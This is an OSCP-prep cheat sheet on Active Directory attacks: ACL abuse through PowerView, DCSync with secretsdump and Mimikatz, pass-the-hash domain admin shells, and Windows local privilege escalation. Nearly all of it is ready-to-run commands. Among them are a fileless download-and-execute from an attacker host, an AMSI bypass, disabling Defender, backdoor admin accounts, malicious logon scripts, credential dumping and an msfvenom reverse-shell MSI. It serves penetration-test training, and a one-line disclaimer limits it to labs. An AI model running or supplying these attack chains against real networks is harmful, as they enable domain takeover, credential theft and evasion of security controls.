# Active Directory
## ACL Abuse + DCSync + Domain Admin Compromise + Local Privesc

> **Legend:**
> `[KALI]` = Run on Kali (attack machine)
> `[WINDOWS]` = Run on victim/foothold Windows machine
>
> **Context:** This is for OSCP exam preparation and authorized penetration testing labs only.

---

## Master Decision Tree — ACL to Domain Admin

```
BloodHound → Owned account → Outbound Object Control
                    │
        ┌───────────┼───────────────────┐
        │           │                   │
    on USER     on GROUP           on DOMAIN
        │           │               OBJECT
        │           │                   │
  ┌─────┴─────┐  AddMember?        WriteDACL?
  │           │      │                  │
GenericAll GenericWrite Add self     Add DCSync
  │           │    to DA group      rights to
  │           │         │           self → run
  ├─ Password  ├─ SPN set │           secretsdump
  │  Reset     │  → Kerb- │
  └─ SPN set  │  roast   └─ DA shell
     → Kerb-  │
     roast    └─ Logon
               script abuse
        │
    WriteOwner?
        │
    Set owner → WriteDACL → GenericAll → password reset
```

---

## STEP 0 — Find ACL Edges in BloodHound

```
# BloodHound UI Steps:
1. Search your owned account (e.g. jdoe)
2. Click on node
3. Right panel → "Outbound Object Control"
4. Analysis → "Shortest Path from Owned Principals"
5. Analysis → "Find Shortest Paths to Domain Admins"

# Dangerous edges to look for:
GenericAll       → full control over target
GenericWrite     → modify target attributes
WriteDACL        → modify target permissions
WriteOwner       → take ownership of target
ForceChangePassword → reset password without knowing current
AddMember        → add members to group
AllExtendedRights → password reset + more
```

### PowerView — Manual ACL Check
`[WINDOWS]`
```powershell
# Check ACLs on a specific object
Get-DomainObjectAcl -Identity "svc_sql" -ResolveGUIDs

# Find interesting ACLs for your user
Get-DomainObjectAcl -Identity "svc_sql" -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -match "jdoe"
}

# Find ALL interesting ACLs in domain — takes time
Find-InterestingDomainAcl -ResolveGUIDs

# Check who has rights on Domain Admins group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL"
}
```

---

## STEP 1 — Tool Setup

### PowerView — Upload and Load
`[KALI]`
```bash
# Start HTTP server to serve PowerView
python3 -m http.server 80
# PowerView should be at /opt/PowerView.ps1
```

`[WINDOWS]`
```powershell
# Method 1 — Download via evil-winrm
*Evil-WinRM* PS> upload /opt/PowerView.ps1 C:\Temp\PowerView.ps1

# Method 2 — Download in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# Method 3 — certutil download
certutil -urlcache -split -f http://KALI_IP/PowerView.ps1 C:\Temp\PowerView.ps1

# AMSI bypass FIRST before loading PowerView
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Disable Defender (needs admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Import PowerView
Import-Module C:\Temp\PowerView.ps1
# OR if loaded in memory with IEX — already available
```

### evil-winrm — Start Session
`[KALI]`
```bash
# With password
evil-winrm -i VICTIM_IP -u jdoe -p 'Password123!'

# With hash
evil-winrm -i VICTIM_IP -u jdoe -H NTHASH

# With scripts folder (auto-loads PowerShell scripts)
evil-winrm -i VICTIM_IP -u jdoe -p 'Password123!' -s /opt/scripts/
```

---

## STEP 2 — GenericAll Abuse

### Case A — GenericAll on User → Password Reset

`[WINDOWS]`
```powershell
# Reset target user password — no need to know current password
Set-DomainUserPassword \
    -Identity svc_sql \
    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) \
    -Verbose
```

`[KALI]`
```bash
# Linux alternative — net rpc
net rpc password svc_sql 'Hacked123!' \
    -U corp.local/jdoe%Password123! \
    -S DC_IP

# Validate the new password works
nxc smb DC_IP -u svc_sql -p 'Hacked123!' -d corp.local
```

---

### Case B — GenericAll on User → Targeted Kerberoasting

`[WINDOWS]`
```powershell
# Step 1 — Set fake SPN on target (makes them Kerberoastable)
Set-DomainObject -Identity svc_sql \
    -Set @{serviceprincipalname='fake/nothing.corp.local'} \
    -Verbose

# Verify SPN was set
Get-DomainUser svc_sql | select samaccountname, serviceprincipalname
```

`[KALI]`
```bash
# Step 2 — Kerberoast the account
impacket-GetUserSPNs corp.local/jdoe:Password123! \
    -dc-ip DC_IP \
    -request \
    -outputfile targeted_kerb.txt

# Step 3 — Crack the hash
hashcat -m 13100 targeted_kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 targeted_kerb.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 13100 targeted_kerb.txt --show
```

`[WINDOWS]`
```powershell
# Step 4 — Cleanup: remove fake SPN
Set-DomainObject -Identity svc_sql -Clear serviceprincipalname
```

---

### Case C — GenericAll on Group → Add Member to Domain Admins

`[WINDOWS]`
```powershell
# Add yourself directly to Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' \
    -Members 'jdoe' \
    -Verbose

# Confirm you're in the group
Get-DomainGroupMember -Identity 'Domain Admins'

# Also works on other privileged groups
Add-DomainGroupMember -Identity 'Enterprise Admins' -Members 'jdoe' -Verbose
Add-DomainGroupMember -Identity 'Backup Operators' -Members 'jdoe' -Verbose
```

`[KALI]`
```bash
# Linux alternative — net rpc
net rpc group addmem "Domain Admins" jdoe \
    -U corp.local/jdoe%Password123! \
    -S DC_IP

# Confirm membership
net rpc group members "Domain Admins" \
    -U corp.local/jdoe%Password123! \
    -S DC_IP
```

---

## STEP 3 — GenericWrite Abuse

### GenericWrite on User → SPN Set (Kerberoast)
`[WINDOWS]`
```powershell
# Same as GenericAll Case B — set SPN then Kerberoast
Set-DomainObject -Identity victim_user \
    -Set @{serviceprincipalname='fake/nothing.corp.local'} \
    -Verbose
# Then run GetUserSPNs from Kali (see Case B above)
```

### GenericWrite on User → Logon Script Abuse
`[KALI]`
```bash
# Step 1 — Create evil script
echo "net user hacker Password123! /add" > /tmp/share/evil.bat
echo "net localgroup administrators hacker /add" >> /tmp/share/evil.bat

# Step 2 — Host SMB share
impacket-smbserver share /tmp/share -smb2support
```

`[WINDOWS]`
```powershell
# Step 3 — Set logon script on victim user
# When victim logs in → script runs
Set-DomainObject -Identity victim_user \
    -Set @{scriptpath='\\KALI_IP\share\evil.bat'} \
    -Verbose

# Wait for victim to log in
# OR force logoff via another technique
```

---

## STEP 4 — WriteDACL Abuse

### WriteDACL on Domain Object → DCSync Rights

> **Why this is powerful:** WriteDACL on the domain object lets you add DCSync permissions to yourself. DCSync = dump all hashes from DC without touching the DC directly.

`[WINDOWS]`
```powershell
# Step 1 — Add DCSync rights to yourself
Add-DomainObjectAcl \
    -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity jdoe \
    -Rights DCSync \
    -Verbose

# Step 2 — Verify the rights were added
Get-DomainObjectAcl -Identity "DC=corp,DC=local" \
    -ResolveGUIDs | Where-Object {
        $_.SecurityIdentifier -match "jdoe"
    }
```

`[KALI]`
```bash
# Step 3 — Run DCSync (see Step 6 for full DCSync section)
impacket-secretsdump corp.local/jdoe:Password123!@DC_IP -just-dc
```

### WriteDACL on User → Give Yourself GenericAll
`[WINDOWS]`
```powershell
# Give yourself GenericAll on target user
Add-DomainObjectAcl \
    -TargetIdentity svc_sql \
    -PrincipalIdentity jdoe \
    -Rights All \
    -Verbose

# Now run GenericAll attacks (Step 2)
```

---

## STEP 5 — WriteOwner + ForceChangePassword

### WriteOwner — 3 Step Chain
`[WINDOWS]`
```powershell
# Step 1 — Take ownership of target object
Set-DomainObjectOwner \
    -Identity svc_sql \
    -OwnerIdentity jdoe \
    -Verbose

# Step 2 — As owner, give yourself WriteDACL/GenericAll
Add-DomainObjectAcl \
    -TargetIdentity svc_sql \
    -PrincipalIdentity jdoe \
    -Rights All \
    -Verbose

# Step 3 — Now do password reset or Kerberoast
Set-DomainUserPassword \
    -Identity svc_sql \
    -AccountPassword (ConvertTo-SecureString 'Owned123!' -AsPlainText -Force) \
    -Verbose
```

### ForceChangePassword
`[WINDOWS]`
```powershell
# Reset password without knowing current password
Set-DomainUserPassword \
    -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) \
    -Verbose
```

`[KALI]`
```bash
# Linux — rpcclient
rpcclient -U "corp.local/jdoe%Password123!" DC_IP
rpcclient $> setuserinfo2 targetuser 23 'NewPass123!'
rpcclient $> exit

# Validate
nxc smb DC_IP -u targetuser -p 'NewPass123!' -d corp.local
```

> **Warning:** ForceChangePassword on service accounts may break services.
> Prefer targeted Kerberoasting over password reset when possible.

---

## STEP 6 — DCSync Attack

### What DCSync Does
```
Normal DC Replication:
DC1 ←──replication sync──→ DC2   (legitimate AD feature)

DCSync Attack:
Kali ──"I am DC2, send me all hashes"──→ DC1
DC1 thinks: "Another DC requesting sync" → sends all hashes
```

### Who Can DCSync by Default
```
Domain Admins          ← always
Enterprise Admins      ← always
Domain Controllers     ← always
Accounts with          ← after WriteDACL abuse (Step 4)
DS-Replication rights
```

### impacket-secretsdump — From Kali
`[KALI]`
```bash
# With password — dump all domain hashes
impacket-secretsdump corp.local/jdoe:Password123!@DC_IP -just-dc

# With NT hash (PtH style)
impacket-secretsdump corp.local/jdoe@DC_IP \
    -hashes :NTHASH \
    -just-dc

# Dump only specific user
impacket-secretsdump corp.local/jdoe:Password123!@DC_IP \
    -just-dc-user Administrator

# Save output to file
impacket-secretsdump corp.local/jdoe:Password123!@DC_IP \
    -just-dc \
    -outputfile /tmp/domain_hashes.txt
```

### DCSync Output — What to Save
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
              RID  LM (ignore)                       NT hash ← SAVE THIS

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9e17a9b02ae06a1e5283a3db2878b62f:::
       ↑                                     ↑
  Always 502                         SAVE — Golden Ticket key

jdoe:1103:aad3b435b51404eeaad3b435b51404ee:44f77b6a3c8a8d9ba4e7f20e3c145c74:::
svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:abc123def456abc123def456abc123de:::
```

**Priority hashes to save:**
```
Administrator NT hash  → PtH for DA shell on DC
krbtgt NT hash         → Golden Ticket (persistence, Part 4)
All other hashes       → crack offline, find more accounts
```

### Mimikatz DCSync — From Windows
`[WINDOWS]`
```powershell
# Single user hash
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# All users
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Output — find this line:
# Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4  ← copy this
```

---

## STEP 7 — DA Shell on DC

### After Getting Administrator NT Hash
`[KALI]`
```bash
# Method 1 — psexec (SYSTEM shell, noisy)
impacket-psexec corp.local/Administrator@DC_IP \
    -hashes :32ed87bdb5fdc5e9cba88547376818d4

# Method 2 — wmiexec (admin shell, quieter)
impacket-wmiexec corp.local/Administrator@DC_IP \
    -hashes :32ed87bdb5fdc5e9cba88547376818d4

# Method 3 — evil-winrm (if WinRM open on DC)
evil-winrm -i DC_IP \
    -u Administrator \
    -H 32ed87bdb5fdc5e9cba88547376818d4

# Method 4 — smbexec (stealth)
impacket-smbexec corp.local/Administrator@DC_IP \
    -hashes :32ed87bdb5fdc5e9cba88547376818d4
```

### Confirm DA Access + Capture Proof
`[WINDOWS]`
```cmd
# Confirm who you are
whoami
whoami /groups

# Check domain admin membership
net group "Domain Admins" /domain

# OSCP proof flag locations
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\local.txt

# Also check
dir C:\Users\Administrator\Desktop\
```

---

## STEP 8 — Complete Attack Paths

### Path A — Kerberoast → Direct DA
```bash
# When: SPN account is member of Domain Admins (BloodHound shows this)
# BloodHound: svc_sql ──MemberOf──→ Domain Admins

# [KALI] Step 1 — Get SPN hashes
impacket-GetUserSPNs corp.local/jdoe:Password123! \
    -dc-ip DC_IP -request -outputfile kerb.txt

# [KALI] Step 2 — Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# Result: svc_sql:SQLAdmin2024!

# [KALI] Step 3 — Validate
nxc smb DC_IP -u svc_sql -p 'SQLAdmin2024!' -d corp.local
# (Pwn3d!) ← DA access confirmed

# [KALI] Step 4 — Shell
evil-winrm -i DC_IP -u svc_sql -p 'SQLAdmin2024!'
```

---

### Path B — AS-REP → WriteDACL → DCSync → DA
```bash
# When: AS-REP user has WriteDACL on domain object (BloodHound shows this)
# BloodHound: jdoe ──WriteDACL──→ domain object

# [KALI] Step 1 — AS-REP Roast
impacket-GetNPUsers corp.local/ \
    -usersfile userlist.txt \
    -dc-ip DC_IP \
    -no-pass -format hashcat \
    -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Result: jdoe:Password123!
```

```powershell
# [WINDOWS] Step 2 — Add DCSync rights
Add-DomainObjectAcl \
    -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity jdoe \
    -Rights DCSync -Verbose
```

```bash
# [KALI] Step 3 — DCSync
impacket-secretsdump corp.local/jdoe:Password123!@DC_IP -just-dc
# Save: Administrator:500:...:ADMIN_NTHASH:::

# Step 4 — DA shell
impacket-psexec corp.local/Administrator@DC_IP -hashes :ADMIN_NTHASH
```

---

### Path C — Lateral Movement Chain → DA
```bash
# When: No direct path — must chain through multiple machines

# [KALI] Step 1 — Shell on WS01
evil-winrm -i WS01_IP -u jdoe -p 'Password123!'
```

```powershell
# [WINDOWS WS01] Step 2 — Harvest credentials
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Set-MpPreference -DisableRealtimeMonitoring $true
*Evil-WinRM* PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Found: asmith:HASH1
```

```bash
# [KALI] Step 3 — Sweep with new hash
nxc smb 192.168.1.0/24 -u asmith -H HASH1
# Pwn3d! on WS02 and DC

# Step 4 — Remote secretsdump on DC
impacket-secretsdump corp.local/asmith@DC_IP -hashes :HASH1

# Step 5 — DA shell
impacket-psexec corp.local/Administrator@DC_IP -hashes :ADMIN_NTHASH
```

---

### Path D — GenericAll → Password Reset → DA Shell
```bash
# When: Your owned account has GenericAll on a Domain Admin account
# BloodHound: jdoe ──GenericAll──→ Administrator
```

```powershell
# [WINDOWS] Step 1 — Reset DA password
Set-DomainUserPassword \
    -Identity Administrator \
    -AccountPassword (ConvertTo-SecureString 'NewAdmin123!' -AsPlainText -Force) \
    -Verbose
```

```bash
# [KALI] Step 2 — Validate
nxc smb DC_IP -u Administrator -p 'NewAdmin123!' -d corp.local

# Step 3 — Shell
evil-winrm -i DC_IP -u Administrator -p 'NewAdmin123!'
```

---

## STEP 9 — Local Privilege Escalation

### Check Privileges First
`[WINDOWS]`
```cmd
whoami /priv
```

### SeImpersonatePrivilege — Most Common in OSCP
`[WINDOWS]`
```powershell
# Check if you have it
whoami /priv | findstr "SeImpersonatePrivilege"
# SeImpersonatePrivilege   Enabled ← means you can escalate
```

```powershell
# Upload tools via evil-winrm
*Evil-WinRM* PS> upload /opt/PrintSpoofer64.exe C:\Temp\PrintSpoofer.exe
*Evil-WinRM* PS> upload /opt/GodPotato-NET4.exe C:\Temp\GodPotato.exe
```

```cmd
# PrintSpoofer — interactive SYSTEM shell
C:\Temp\PrintSpoofer.exe -i -c cmd
# Result: C:\Windows\system32> whoami → nt authority\system

# PrintSpoofer — add admin user
C:\Temp\PrintSpoofer.exe -c "net user hacker Password123! /add"
C:\Temp\PrintSpoofer.exe -c "net localgroup administrators hacker /add"

# GodPotato — newer Windows versions
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"

# JuicyPotatoNG
C:\Temp\JuicyPotatoNG.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
```

### SeBackupPrivilege → SAM Dump
`[WINDOWS]`
```cmd
# Dump registry hives
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
reg save HKLM\SECURITY C:\Temp\security.bak
```

```powershell
# Download to Kali
*Evil-WinRM* PS> download C:\Temp\sam.bak /tmp/sam.bak
*Evil-WinRM* PS> download C:\Temp\system.bak /tmp/system.bak
```

`[KALI]`
```bash
# Crack offline
impacket-secretsdump \
    -sam /tmp/sam.bak \
    -system /tmp/system.bak \
    LOCAL
```

### AlwaysInstallElevated
`[WINDOWS]`
```cmd
# Check both keys — BOTH must be 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

`[KALI]`
```bash
# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=KALI_IP LPORT=4444 \
    -f msi -o /tmp/evil.msi

# Start listener
nc -lvnp 4444
```

`[WINDOWS]`
```powershell
# Upload and run MSI
*Evil-WinRM* PS> upload /tmp/evil.msi C:\Temp\evil.msi
```

```cmd
# Execute — runs as SYSTEM
msiexec /quiet /qn /i C:\Temp\evil.msi
# Shell catches on Kali netcat listener
```

---

## Privilege Escalation Decision Tree

```
whoami /priv
     │
     ├── SeImpersonatePrivilege Enabled?
     │       └── PrintSpoofer.exe -i -c cmd
     │           GodPotato.exe -cmd "cmd /c whoami"
     │
     ├── SeBackupPrivilege Enabled?
     │       └── reg save SAM/SYSTEM → secretsdump LOCAL
     │
     ├── SeDebugPrivilege Enabled?
     │       └── Mimikatz sekurlsa::logonpasswords
     │
     └── AlwaysInstallElevated?
             └── msfvenom MSI → msiexec /i evil.msi
```

---

## Quick Reference — All ACL Abuse Commands

### GenericAll on User
```powershell
# Password reset
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'PASS' -AsPlainText -Force)

# SPN set → Kerberoast
Set-DomainObject -Identity TARGET -Set @{serviceprincipalname='fake/spn'}
# → GetUserSPNs → hashcat -m 13100
# Cleanup:
Set-DomainObject -Identity TARGET -Clear serviceprincipalname
```

### GenericAll on Group
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'YOURUSER'
```

### WriteDACL on Domain
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity YOURUSER -Rights DCSync
# → secretsdump -just-dc
```

### WriteOwner
```powershell
Set-DomainObjectOwner -Identity TARGET -OwnerIdentity YOURUSER
Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity YOURUSER -Rights All
```

### ForceChangePassword
```powershell
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'PASS' -AsPlainText -Force)
```

```bash
# Linux
rpcclient -U "DOMAIN/USER%PASS" DC_IP -c "setuserinfo2 TARGET 23 'NEWPASS'"
```

---

## DCSync Quick Reference

```bash
# With password
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc

# With hash
impacket-secretsdump DOMAIN/USER@DC_IP -hashes :NTHASH -just-dc

# Specific user only
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user Administrator

# Save output
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc -outputfile hashes.txt
```

---

## DA Shell — All Methods After Getting Hash

```bash
# psexec → SYSTEM shell (noisy)
impacket-psexec corp.local/Administrator@DC_IP -hashes :NTHASH

# wmiexec → admin shell (quieter)
impacket-wmiexec corp.local/Administrator@DC_IP -hashes :NTHASH

# evil-winrm → PowerShell (port 5985)
evil-winrm -i DC_IP -u Administrator -H NTHASH

# smbexec → stealth
impacket-smbexec corp.local/Administrator@DC_IP -hashes :NTHASH
```

---

## Notes Template — OSCP Report

```
[Attack]              [Tool]           [Credential Used]     [Result]
AS-REP Roast          GetNPUsers       none                  jdoe:Password123!
WriteDACL abuse       PowerView        jdoe:Password123!     DCSync rights added
DCSync                secretsdump      jdoe:Password123!     Admin NTHASH obtained
DA Shell              psexec           Admin NTHASH           DC01 SYSTEM shell
Proof Flag            type             —                      [flag value]
```

---

## Common Errors + Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `Access Denied` on PowerView | AMSI blocking | Run AMSI bypass first |
| `Add-DomainObjectAcl failed` | Insufficient rights | Verify edge in BloodHound |
| `KDC_ERR_BADOPTION` Kerberoast | SPN not set correctly | Verify with Get-DomainUser |
| `STATUS_LOGON_FAILURE` DCSync | Wrong creds | Recheck hash/password |
| `[-] Connection refused` psexec | Port 445 closed | Try wmiexec or evil-winrm |
| `Clock skew` Kerberos | Time diff > 5 min | `sudo ntpdate DC_IP` |

---

## Tools Download Locations

`[KALI]`
```bash
# PowerView
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O /opt/PowerView.ps1

# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -O /opt/PrintSpoofer64.exe

# GodPotato
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -O /opt/GodPotato.exe

# JuicyPotatoNG
wget https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip -O /tmp/jp.zip
unzip /tmp/jp.zip -d /opt/

# Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O /tmp/mimi.zip
unzip /tmp/mimi.zip -d /opt/mimikatz/

# Check impacket tools
which impacket-secretsdump impacket-psexec impacket-wmiexec
```

---

## tips

```
1. Always check BloodHound FIRST — Outbound Object Control on every owned account
2. WriteDACL on domain object = game over — add DCSync immediately
3. GenericAll on group = add yourself to Domain Admins = DA
4. After DCSync — save Administrator AND krbtgt hashes (krbtgt = Golden Ticket)
5. whoami /priv on every new shell — SeImpersonatePrivilege is very common
6. Capture proof.txt IMMEDIATELY after DA shell — screenshot + content
7. secretsdump with -just-dc flag for domain hashes, without flag for local
8. Try all 4 shell methods if one fails (psexec/wmiexec/evil-winrm/smbexec)
9. Always note original passwords before resetting — cleanup matters in real engagements
10. BloodHound: after every new owned account → re-run Shortest Path queries
```

---

*Part 3B — ACL Abuse + DCSync + Domain Admin*
*Next → Part 4: Golden Ticket + Persistence + OSCP Exam Strategy*
